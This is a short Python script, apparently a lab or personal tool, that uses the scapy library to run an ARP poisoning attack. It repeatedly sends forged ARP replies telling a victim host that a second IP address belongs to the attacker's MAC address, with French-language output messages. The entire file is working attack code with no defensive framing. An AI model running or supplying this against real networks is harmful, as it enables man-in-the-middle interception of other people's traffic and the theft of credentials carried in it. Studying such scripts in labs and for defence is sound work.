#!/usr/bin/env python3
from scapy.all import *
import time
import sys

if len(sys.argv) != 3:
	print("Usage: sudo python3 arp_poisoning.py 10.1.10.1 10.1.10.40")
	sys.exit(1)

VICTIME = sys.argv[1]
USURP = sys.argv[2]
MY_MAC = get_if_hwaddr(conf.iface)

print(f"🎭 ARP Poisoning: {VICTIME} ← {USURP} (MAC: {MY_MAC})")

try:
	while True:
		pkt = ARP(op=2, psrc=USURP, pdst=VICTIME, hwsrc=MY_MAC)
		send(pkt, verbose=0, count=10)
		time.sleep(2)
except KeyboardInterrupt:
	print("\n⏹️ Arrêté")
